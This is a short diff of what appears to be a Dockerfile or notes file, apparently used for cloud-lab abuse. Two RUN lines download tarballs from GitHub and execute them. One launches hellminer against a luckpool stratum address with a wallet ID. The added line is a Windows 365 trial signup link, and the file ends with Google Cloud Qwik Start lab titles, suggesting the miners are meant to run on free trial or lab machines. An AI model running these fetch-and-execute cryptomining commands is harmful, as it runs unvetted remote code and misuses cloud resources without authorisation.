@@ -1,7 +1,7 @@
 RUN sudo apt update && wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
 
 RUN sudo apt update && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x hellminer && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r.VM --cpu 2
-
+https://signup.microsoft.com/get-started/signup?products=5e6ef6ba-b2d1-441e-a489-998a7f448a84&ru=https%3a%2f%2faka.ms%2fw365-business-manage&hsl=1&culture=en-us&country=us&ali=1&bac=1
 A Tour of Google Cloud Hands-on Labs
 Google Cloud Pub/Sub: Qwik Start - Console
 Google Cloud Pub/Sub: Qwik Start - Command Line
